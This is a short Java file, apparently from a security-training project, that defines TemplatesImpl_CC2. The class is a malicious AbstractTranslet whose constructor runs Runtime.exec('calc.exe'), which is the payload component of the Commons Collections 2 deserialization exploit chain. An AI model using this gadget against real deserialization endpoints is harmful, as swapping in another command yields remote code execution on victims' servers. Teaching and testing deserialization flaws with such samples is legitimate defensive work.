package com.madaha.codesecone.controller.AdvancedAttack.deserialize.CommonCollections;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class TemplatesImpl_CC2 extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public TemplatesImpl_CC2() throws IOException {
        super();
        Runtime.getRuntime().exec("calc.exe");
        System.out.println("Hello TemplatesImpl");
    }
}
